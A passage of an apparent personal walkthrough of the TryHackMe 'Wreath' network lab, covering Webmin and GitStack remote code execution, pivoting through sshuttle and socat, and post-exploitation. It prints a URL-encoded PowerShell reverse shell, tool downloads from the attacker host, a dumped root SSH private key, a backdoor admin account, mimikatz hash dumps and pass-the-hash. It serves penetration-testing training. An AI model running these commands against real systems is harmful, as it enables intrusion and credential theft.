[Home](../../index.md)

# TryHackMe: Wreath Network

https://tryhackme.com/room/wreath

---
## Task 5 - Webserver Enumeration

Initial scan

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ rustscan -a 10.200.196.200 -r 1-65535 -- -A

PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:                       
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfKbbFLiRV9dqsrYQifAghp85qmXpYEHf2g4JJqDKUL316TcAoGj62aamfhx5isIJHtQsA0hVmzD+4pVH4r8ANkuIIRs6j9cnBrLGpjk8xz9+BE1Vvd8lmORGxCqTv+9LgrpB7tcfoEkIOSG7zeY182kOR72igUERpy0JkzxJm2gIGb7Caz1s5/ScHEOhGX8VhNT4clOhDc9dLePRQvRooicIsENqQsLckE0eJB7rTSxemWduL+twySqtwN80a7pRzS7dzR4f6fkhVBAhYfl
JBW3iZ46zOItZcwT2u0wReCrFzxvDxEOewH7YHFpvOvb+Exuf3W6OuSjCHF64S7iU6z92aINNf+dSROACXbmGnBhTlGaV57brOXzujsWDylivWZ7CVVj1gB6mrNfEpBNE983qZskyVk4eTNT5cUD+3I/IPOz1bOtOWiraZCevFYaQR5AxNmx8sDIgo1z4VcxOMhrczc7RC/s3KWcoIkI2cI5+KUnDtaOfUClXPBCgYE50=
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFccvYHwpGWYUsw9mTk/mEvzyrY4ghhX2D6o3n/upTLFXbhJPV6ls4C8O0wH6TyGq7ClV3XpVa7zevngNoqlwzM=
|   256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINLfVtZHSGvCy3JP5GX0Dgzcxz+Y9In0TcQc3vhvMXCP
80/tcp    open  http     syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Did not follow redirect to https://thomaswreath.thm
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp   open  ssl/http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: Thomas Wreath | Developer
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/localityName=Easingwold/emailAddress=me@thomaswreath.thm
| Issuer: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/localityName=Easingwold/emailAddress=me@thomaswreath.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-01-05T17:13:28
| Not valid after:  2023-01-05T17:13:28
| MD5:   4617 2dbd 869a 12ba 96d0 354c 537e 1f47
| SHA-1: 560a dbad 3a2d 7c63 4111 ae96 6f9b a3e9 4e25 32c7
| -----BEGIN CERTIFICATE-----
| MIIELTCCAxWgAwIBAgIUPtYJYc2ty1FyzSGe7JvhkNHS1wEwDQYJKoZIhvcNAQEL
| BQAwgaUxCzAJBgNVBAYTAkdCMR4wHAYDVQQIDBVFYXN0IFJpZGluZyBZb3Jrc2hp
| cmUxEzARBgNVBAcMCkVhc2luZ3dvbGQxIjAgBgNVBAoMGVRob21hcyBXcmVhdGgg
| RGV2ZWxvcG1lbnQxGTAXBgNVBAMMEHRob21hc3dyZWF0aC50aG0xIjAgBgkqhkiG
| 9w0BCQEWE21lQHRob21hc3dyZWF0aC50aG0wHhcNMjIwMTA1MTcxMzI4WhcNMjMw
| MTA1MTcxMzI4WjCBpTELMAkGA1UEBhMCR0IxHjAcBgNVBAgMFUVhc3QgUmlkaW5n
| IFlvcmtzaGlyZTETMBEGA1UEBwwKRWFzaW5nd29sZDEiMCAGA1UECgwZVGhvbWFz
| IFdyZWF0aCBEZXZlbG9wbWVudDEZMBcGA1UEAwwQdGhvbWFzd3JlYXRoLnRobTEi
| MCAGCSqGSIb3DQEJARYTbWVAdGhvbWFzd3JlYXRoLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBANiL5IjfqPCJqUCcqMoIAae24U8s37dVJjVPDni3
| FwgXVGKHRAo7hXiZY5EoX3G0NcSTDx7RGdtYXJGfc87ubR4fO5xtZZIEgHsHcf18
| FYlAqgEhIT6llmD+ERK896suaNlVy1jQTXfNayJuZY8c/F3IO4rIrWqDzA/Xmn6e
| 7cMV84FDAxJRDagBFk1h0oVWxHG66htOS9x2AFrZYcuDA3dsw+Qt/Gt2SReMTPrv
| SsdLfirM0bZU/VDz43ZmcS+K1vAlWy92neq5H9Bom1R8N5JjyhrebOtUkEMqVOEP
| gsiGVHQJXau9Gbk2B+c6S4D3sTxPW714wTdFR2XEGc4aO1UCAwEAAaNTMFEwHQYD
| VR0OBBYEFKSWMvFRjsoZZ3oVgNEMzBm3aDWZMB8GA1UdIwQYMBaAFKSWMvFRjsoZ
| Z3oVgNEMzBm3aDWZMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AJxuo9cKIkdpa/JAMy1Ppeam3Mz7e4PVXPeufnMd6eDVFl7GgZq9cQhuT1Meebp6
| 6ZfYHLpVtd18pU0e35yDmxrthgj/W0LVLX0xfW3ctiInk9bYIUhLz605PSx+AP3u
| KCyzzQyt0G+E1dSJaXL4iSE7sqs4ypUc+dWXdfS9KBla4B6cXloJg9v7/1outiwB
| QhfJOvy9PxnAQiemwMTp7nsc4QfAzrwgBQaKkR7DEQ1jH9TLf1Bm+a+Sad3yWG/5
| zVgFHsti+yg9N+AlUgQ5z9vrobRnwquFKN71O27b77GkxmzsuK4Ud7UR2pddx7lX
| Sdfl+lqXmVRqQFqn7jEWOl8=
|_-----END CERTIFICATE-----
10000/tcp open  http     syn-ack MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: 7BB7FDC400A503ADAC6872774DE20505
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

Attempting to access the site in a browser redirects to https://thomaswreath.thm.  We need to add this entry to /etc/hosts on our machine.

```
10.200.196.200  thomaswreath.thm
```

The website now loads.

Googling for `MiniServ 1.890` (service running on TCP 10000) quickly reveals an RCE vuln, CVE-2019-15107.

---
## Task 6 - Webserver Exploitation

We download the exploit and install the requirements as outlined in the task and run it against the target.

```
┌──(kali㉿kali)-[~/tryhackme/wreath/CVE-2019-15107]                   
└─$ ./CVE-2019-15107.py thomaswreath.thm      
                                                                               
        __        __   _               _         ____   ____ _____ 
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|  
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___ 
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|

                                                @MuirlandOracle


[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://thomaswreath.thm:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
# python3 -c "import pty; pty.spawn('/bin/bash')"
[-] Failed to execute command
```

I was not able to stabilize my shell, python3 failed to run, but I was able to pull id_rsa for consistent root access.

```
# cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

After pasting the key into a file locally and changing permissions we have easier root access.

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ vim id_rsa      

┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ chmod 400 id_rsa  
                                                                                       
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ ssh root@thomaswreath.thm -i id_rsa 
The authenticity of host 'thomaswreath.thm (10.200.196.200)' can't be established.
ED25519 key fingerprint is SHA256:7Mnhtkf/5Cs1mRaS3g6PGYXnU8u8ajdIqKU9lQpmYL4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'thomaswreath.thm' (ED25519) to the list of known hosts.
[root@prod-serv ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

---
## Task 17 - Git Server Enumeration

On our attacking machine, we grab the static nmap binary and rename it, then start an HTTP server via Python.

```
┌──(kali㉿kali)-[~/tryhackme/wreath]                                           
└─$ wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true

...

┌──(kali㉿kali)-[~/tryhackme/wreath]                                           
└─$ mv nmap\?raw=true nmap-narrowtomato 

┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

On the compromised web server, use curl (wget is not available) to grab the file and make it executable.  We can then run our host scan.

```
[root@prod-serv ~]# wget http://10.50.193.88:8000/nmap-narrowtomato
-bash: wget: command not found

[root@prod-serv ~]# curl http://10.50.193.88:8000/nmap-narrowtomato -o /tmp/nmap-narrowtomato && chmod +x /tmp/nmap-narrowtomato
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 5805k  100 5805k    0     0   767k      0  0:00:07  0:00:07 --:--:--  698k

[root@prod-serv ~]# /tmp/nmap-narrowtomato -sn 10.200.196.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-01-12 19:18 GMT
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-196-1.eu-west-1.compute.internal (10.200.196.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.18s latency).
MAC Address: 02:B9:CF:AB:2E:FB (Unknown)
Nmap scan report for ip-10-200-196-100.eu-west-1.compute.internal (10.200.196.100)
Host is up (0.00025s latency).
MAC Address: 02:AD:4C:0A:D7:E7 (Unknown)
Nmap scan report for ip-10-200-196-150.eu-west-1.compute.internal (10.200.196.150)
Host is up (0.00030s latency).
MAC Address: 02:50:35:43:27:C3 (Unknown)
Nmap scan report for ip-10-200-196-250.eu-west-1.compute.internal (10.200.196.250)
Host is up (0.00035s latency).
MAC Address: 02:BE:4E:DD:79:D7 (Unknown)
Nmap scan report for ip-10-200-196-200.eu-west-1.compute.internal (10.200.196.200)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 4.83 seconds
```

`10.200.196.100` and `10.200.196.150` are the items of interest here, as `10.200.196.1` is the gateway, `10.200.196.200` is the web server, and `10.200.196.250` is the VPN gateway as explained in the task.

We proceed with port scans.

`10.200.196.100`, all ports are filtered.

```
[root@prod-serv ~]# sudo /tmp/nmap-narrowtomato -p- 10.200.196.100 -T 5

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-01-12 19:32 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-196-100.eu-west-1.compute.internal (10.200.196.100)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.20s latency).
All 65535 scanned ports on ip-10-200-196-100.eu-west-1.compute.internal (10.200.196.100) are filtered
MAC Address: 02:AD:4C:0A:D7:E7 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 659.35 seconds
```

`10.200.196.150`, has more useful results.

```
[root@prod-serv ~]# sudo /tmp/nmap-narrowtomato -p 1-9999 10.200.196.150 -T 5

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-01-12 19:59 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-196-150.eu-west-1.compute.internal (10.200.196.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00056s latency).
Not shown: 9995 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
5985/tcp open  wsman
MAC Address: 02:50:35:43:27:C3 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 126.15 seconds

```

---
## Task 18 - Git Server Pivoting

The task recommends we use `sshuttle`, so first we install that

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ sudo apt install sshuttle
```

Then we connect to the web server using our private key and define the network.  Use the `-x` flag to exclude the web server, otherwise you will get a broken pipe error (read Task 15 for more details on how `sshuttle` works)

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ sudo sshuttle -r root@thomaswreath.thm --ssh-cmd "ssh -i id_rsa" 10.200.196.0/24 -x thomaswreath.thm 
c : Connected to server.
```

We can now browse to the web server on `10.200.196.150`.  Doing so gives us an error, but we are obviously hitting a web server.

![wreath1.PNG](./img/wreath1.PNG "wreath1.PNG")

Reading the error, we can conclude that this is running gitstack.  Browsing to `/gitstack` nets us a login page.

Unfortunately the default login does not work.  Let's check for existing exploits related to Gitstack.

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ searchsploit gitstack                          
--------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
GitStack - Remote Code Execution                                    | php/webapps/44044.md
GitStack - Unsanitized Argument Remote Code Execution (Metasploit)  | windows/remote/44356.rb
GitStack 2.3.10 - Remote Code Execution                             | php/webapps/43777.py
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

---
## Task 19 - Git Server Code Review

Download the 3rd exploit and convert to Unix line endings (explained in the task)

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ searchsploit -m 43777
  Exploit: GitStack 2.3.10 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/43777
     Path: /usr/share/exploitdb/exploits/php/webapps/43777.py
File Type: Python script, ASCII text executable

Copied to: /home/kali/tryhackme/wreath/43777.py
                                              
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ dos2unix 43777.py 
dos2unix: converting file 43777.py to Unix format...
```

Let's review the script.  Since the script uses Python2, we need to add a shebang to the top.

```
#!/usr/bin/python2
```

Also we need to change the `ip` target.

```
ip = '10.200.196.150'
```

Finally, there are two lines that contain the name of the generated exploit that is placed on the web server.  We need to change this name to use our username for the purposes of being a good lab citizen.  `exploit.php` needs to be changed to `exploit-USERNAME.php`

We will leave the command as `whoami` for now.  We just need to confirm the exploit works before trying for a shell.

---
## Task 20 - Git Server Exploitation

Should have done this earlier, but for convenience we add this line to our /etc/hosts

```
10.200.196.150  gitserver.thm
```

Let's run the exploit with the `whoami` command

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ ./43777.py                  
[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. 
[+] Execute command
"nt authority\system
" 
```

Now that we have confirmed it works, we can send it a webshell.  Instead of changing the command through the script, we are going to use the existing webshell to send command via a POST request with `curl`.  

First, we need to see if a reverse shell can even make it to our attacking machine.  First set up a `tcpdump` listener on the attacking machine.

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ sudo tcpdump -i tun0 icmp               
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Then run a `ping` from the Git server via our webshell (URL encode command)

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ curl -X POST http://gitserver.thm/web/exploit-narrowtomato.php -d "a=ping%20-n%203%2010.50.193.88"                                      
"
Pinging 10.50.193.88 with 32 bytes of data:
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 10.50.193.88:
    Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
" 
```

Since this is not making it, we need to 

Open a port in the firewall on the compromised machine.

```
[root@prod-serv ~]# firewall-cmd --zone=public --add-port 56565/tcp
success
```

Create a listener or relay on the compromised machine.  We will create a `socat` relay for the sake of practice.

Attacking machine:

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true

┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ mv socat\?raw=true socat-narrowtomato

┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Compromised web server:

```
[root@prod-serv ~]# curl http://10.50.193.88:8000/socat-narrowtomato -o /tmp/socat-narrowtomato && chmod +x /tmp/socat-narrowtomato
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  366k  100  366k    0     0   410k      0 --:--:-- --:--:-- --:--:--  410k
[root@prod-serv ~]# /tmp/socat-narrowtomato 
2022/01/14 16:08:14 socat-narrowtomato[8796] E exactly 2 addresses required (there are 0); use option "-h" for help
```

Attacking machine:

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ nc -lvnp 443
listening on [any] 443 ...
```

Compromised web server:

```
[root@prod-serv ~]# /tmp/socat-narrowtomato tcp-l:56565 tcp:10.50.193.88:443 &
[1] 69173
```

Notice we used the port that we opened up on the firewall.

Now we are ready to send a reverse shell to the git server.  After replacing the IP and PORT and URL-encoding the powershell script provided in the task (encode ALL special characters :) ) ,

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ curl -X POST -d "a=powershell%2Eexe%20%2Dc%20%22%24client%20%3D%20New%2DObject%20System%2ENet%2ESockets%2ETCPClient%28%2710%2E200%2E196%2E200%27%2C56565%29%3B%24stream%20%3D%20%24client%2EGetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200%2E%2E65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream%2ERead%28%24bytes%2C%200%2C%20%24bytes%2ELength%29%29%20%2Dne%200%29%7B%3B%24data%20%3D%20%28New%2DObject%20%2DTypeName%20System%2EText%2EASCIIEncoding%29%2EGetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out%2DString%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29%2EPath%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext%2Eencoding%5D%3A%3AASCII%29%2EGetBytes%28%24sendback2%29%3B%24stream%2EWrite%28%24sendbyte%2C0%2C%24sendbyte%2ELength%29%3B%24stream%2EFlush%28%29%7D%3B%24client%2EClose%28%29%22" http://gitserver.thm/web/exploit-narrowtomato.php
```

This gets us a connection on our listener.

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ nc -lvnp 443
listening on [any] 443 ...
id
connect to [10.50.193.88] from (UNKNOWN) [10.200.196.200] 53676
PS C:\GitStack\gitphp>
```

---
## Task 21 - Git Server Stablilisation & Post Exploitation

Since we are `nt authority/system`, we can create our own user and give it Admin and Remote Management access.

```
PS C:\GitStack\gitphp> net user narrowtomato blah /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup Administrators narrowtomato /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup "Remote Management Users" narrowtomato /add    
The command completed successfully.

PS C:\GitStack\gitphp> net user narrowtomato
User name                    narrowtomato
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            14/01/2022 16:31:31
Password expires             Never
Password changeable          14/01/2022 16:31:31
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users                
Global Group memberships     *None                 
The command completed successfully.
```

We can now install evil-winrm on our attack maching and get a more stable connection that way

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ sudo gem install evil-winrm 

┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ evil-winrm -u narrowtomato -p blah -i gitserver.thm

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\narrowtomato\Documents> 
```

We can also get an RDP session complete with a shared drive:

```
┌──(kali㉿kali)-[~/tryhackme/wreath]   
└─$ xfreerdp /v:gitserver.thm /u:narrowtomato /p:'blah' /dynamic-resolution +clipboard /drive:/usr/share/windows-resources,share
```

We can see our share:

![wreath2.PNG](./img/wreath2.PNG "wreath2.PNG")

This gives us easy access to `mimikatz`.  We run a command prompt as an administrator.

```
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>\\tsclient\share\mimikatz\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

672     {0;000003e7} 1 D 20266          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000c604d} 2 F 1706999     GIT-SERV\narrowtomato   S-1-5-21-3335744492-1614955177-2693036043-1002
(15g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 1751589     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::sam
```

This gives us password hashes, the two below are the most useful

```
User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1

User : Thomas
  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f
```

We can't crack the Admin password, but Thomas's password is easily cracked on `https://crackstation.net` to be `i<3ruby`.

To get consistent Admin access to the machine without having to go through all this every time the lab is restarted, we can use `evil-winrm` to pass the hash for the Admin account.

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i gitserver.thm

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
git-serv\administrator
```

---
## Task 23 to 32 - Command and Control - Empire

We install both Empire and Starkiller

```
┌──(kali㉿kali)-[~]
└─$ sudo apt install powershell-empire starkiller 
```

Start an Empire server

```
┌──(kali㉿kali)-[~]
└─$ sudo powershell-empire server

...

Time Elapsed 00:00:07.07
[+] Plugin csharpserver ran successfully!
[*] Compiler ready
Server >
```

Start the Empire client in a separate terminal

```
┌──(kali㉿kali)-[~]
└─$ sudo powershell-empire client

...

   _______   ___  ___   ______    __   ______        _______
  |   ____| |   \/   | |   _  \  |  | |   _  \      |   ____|
  |  |__    |  \  /  | |  |_)  | |  | |  |_)  |     |  |__
  |   __|   |  |\/|  | |   ___/  |  | |      /      |   __|
  |  |____  |  |  |  | |  |      |  | |  |\  \----. |  |____
  |_______| |__|  |__| | _|      |__| | _| `._____| |_______|


       396 modules currently loaded

       0 listeners currently active

       0 agents currently active

[*] Connected to localhost
(Empire) >
```

If we want to run the Starkiller GUI, 

```
┌──(kali㉿kali)-[~]
